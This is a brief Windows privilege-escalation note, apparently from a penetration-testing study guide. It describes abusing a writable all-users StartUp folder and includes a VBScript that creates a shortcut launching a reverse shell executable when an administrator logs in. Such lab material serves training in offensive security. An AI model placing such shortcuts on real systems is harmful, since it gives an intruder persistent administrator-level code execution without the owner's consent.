Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory.

Windows also has a startup directory for apps that should start for all users:

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```


If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.


Note that shortcut files (.lnk) must be used. 
The following VBScript can be used
to create a shortcut file:

```
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start
Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```
